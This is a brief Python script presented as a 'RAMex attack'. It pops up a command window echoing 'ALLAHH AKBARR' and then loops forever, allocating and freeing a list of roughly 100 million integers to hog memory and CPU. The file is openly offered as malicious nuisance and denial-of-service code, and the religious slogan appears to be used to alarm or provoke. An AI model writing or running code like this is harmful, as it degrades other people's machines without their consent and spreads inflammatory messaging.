import os
import subprocess

def exhaust_memory():
    while True:
        large_list = [0] * (1024 * 1024 * 100)
        _ = sum(large_list)
        del large_list

def pop_up_cmd():
    cmd_command = 'cmd /k echo ALLAHH AKBARR'
    subprocess.Popen(cmd_command, shell=True)

if __name__ == "__main__":
    print("Starting RAMex attack...")
    pop_up_cmd()
    exhaust_memory()